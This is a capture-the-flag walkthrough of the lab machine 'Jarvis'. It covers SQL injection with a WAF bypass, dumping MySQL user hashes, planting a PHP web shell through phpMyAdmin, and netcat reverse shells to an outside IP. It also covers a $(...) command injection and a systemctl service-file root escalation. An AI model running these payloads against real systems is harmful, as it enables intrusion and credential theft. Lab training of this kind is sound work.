## Jarvis

Difficulty: Medium

### User Flag

#### Foothold

```
rustscan -a 10.10.10.143 --ulimit 5000 -- -A -sV -sC -oN nmap.txt
```

![rustscan](https://github.com/b1d0ws/OSCP/assets/58514930/d32b29aa-c6cb-494d-a31a-65fcdb41feea)

<br>

GoBuster interesting files to us, but the main is phpmyadmin.

![goBuster](https://github.com/b1d0ws/OSCP/assets/58514930/a65985f4-6f5f-46be-808d-b5b64b57bb36)

<br>

Navigating to the website, we find a GET Parameter in room.php: http://10.10.10.143/room.php?cod=1.

If we try to use sqlmap on this parameter, we get blocked by some kind of WAF.

![banned](https://github.com/b1d0ws/OSCP/assets/58514930/c3b93a24-a51d-40ed-99ea-e02d5598f6a0)

<br>

There are 2 paths to exploit this possible SQL Injection.

#### Automatic Exploitation

To bypass de WAF, we can simply use --random-agent. Probably the WAF is blocking us based on this header.

Since there is no intersting informations inside the room database, we extract the User and Password from the mysql database.

```
sqlmap -u "http://10.10.10.143/room.php?cod=1" -A "NONE" --host "bleble" --dbms MySql --dbs
sqlmap -u "http://10.10.10.143/room.php?cod=1" -A "NONE" --host "bleble" --dbms MySql -D mysql -T user -C User,Password --dump
```

![sqlmapUserPassword](https://github.com/b1d0ws/OSCP/assets/58514930/6d5bc6ae-36c3-4084-a27e-424767252640)

<br>

#### Manual Exploitation

Starts with UNION injection until the page populate somehting:

```
http://10.10.10.143/room.php?cod=100 UNION SELECT 1;-- -
http://10.10.10.143/room.php?cod=100 UNION SELECT 1,2,3,4,5,6,7;-- -
```

![firstUnion](https://github.com/b1d0ws/OSCP/assets/58514930/1e00f1ee-c426-4ac2-b47f-f508b6e22210)

![findingColumns](https://github.com/b1d0ws/OSCP/assets/58514930/985e4d86-4753-4237-82f2-cfe275420ecf)

<br>

Other enumeration commands:

```bash
# Listing DBs
SELECT 1, group_concat(schema_name), 3, 4, 5, 6, 7 from information_schema.schemata;-- -
# Response: hotel,information_schema,mysql,performance_schema

# The "group_concat" put all the values from different rows into one string

# Show tables in hotel
SELECT 1, group_concat(table_name), 3, 4, 5, 6, 7 from information_schema.tables where table_schema='hotel' ;-- -
# Response: room

# Show Columns in room
SELECT 1, group_concat(column_name), 3, 4, 5, 6, 7 from information_schema.columns where table_name='room';-- -
# Response: cod,name,price,descrip,star,image,mini

# Show Tables in mysql
SELECT 1, group_concat(table_name), 3, 4, 5, 6, 7 from information_schema.tables where table_schema='mysql' ;-- -
# Response: [LOT OF TABLES], user

# Show Columns in user
SELECT 1, group_concat(column_name), 3, 4, 5, 6, 7 from information_schema.columns where table_name='user';-- -
# Response: [LOT OF COLUMNS, User, Password

# EXTRA
# You can also read files with LOAD_FILE() function
/room.php?cod=9999+union+select+"1","2",(LOAD_FILE("/var/www/html/connection.php")),"4","5","6","7"
```

The main command is the one below, to extract username and password as well.

```
SELECT 1, user,3, 4,password, 6, 7 from mysql.user;-- -
```

![unionUsernamePassword](https://github.com/b1d0ws/OSCP/assets/58514930/ea120bcc-ec74-4b0c-b412-6089d1168d70)

<br>

#### PHPMyAdmin Reverse Shell

First we crack the password collected in the SQL Injection exploitation.

```
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![crackingHash](https://github.com/b1d0ws/OSCP/assets/58514930/b04fe5a1-6d14-47c0-b83f-e8eb33d441b1)

<br>

After, create a database inside PHPMyAdmin, run the query below and execute a reverse shell:

```
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/backdoor.php"
http://jarvis.htb/backdoor.php?cmd=nc%2010.10.14.11%203333%20-c%20bash
```

![creatingWebShell](https://github.com/b1d0ws/OSCP/assets/58514930/1ec5f4e4-3b44-45d5-b553-a4de811475f7)

![webShellToReverse](https://github.com/b1d0ws/OSCP/assets/58514930/dd4ba1ca-bd09-4503-a422-e06dca0fa10e)

![firstRevShell](https://github.com/b1d0ws/OSCP/assets/58514930/902389bc-4c11-4c82-9ddb-39b05782f791)

<br>

#### User Escalation

sudo -l return us a specific file.

![sudo -l](https://github.com/b1d0ws/OSCP/assets/58514930/ef8f5a54-076d-4238-b137-e181846125b3)

<br>

Reading it, we o find a Command Injection in the ping function. Although it is filtering some special characters, we can still use $(COMMAND) to execute commands and get a reverse shell.

```
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
Enter  an IP: $(/tmp/shell.sh) 127.0.0.1
```

![simplerPy](https://github.com/b1d0ws/OSCP/assets/58514930/9dc58b0c-7d21-477f-bf15-09580b63323b)

![commandInjection](https://github.com/b1d0ws/OSCP/assets/58514930/6562208d-0f0f-48ea-b670-c41d6236c6fd)

<br>

### Root Flag

Enumerating SUID bits, systemctl is among them. This is a privilege escalation possibility.

```
find / -type f -perm -04000 -ls 2>/dev/null
```

![suid](https://github.com/b1d0ws/OSCP/assets/58514930/62aff966-5e08-438e-a5e0-730468a0bf2a)

Create a file called vamo.service with the content below that execute a reverse shell and enable it with systemctl.

```
# vamo.service
[Service]
Type=notify
ExecStart=/bin/bash -c 'nc -e /bin/bash 10.10.14.11 1337'
KillMode=process
Restart=on-failure
RestartSec=42s

[Install]
WantedBy=multi-user.target

# Execute it
systemctl link /home/pepper/vamo.service 
systemctl start vamo 
```
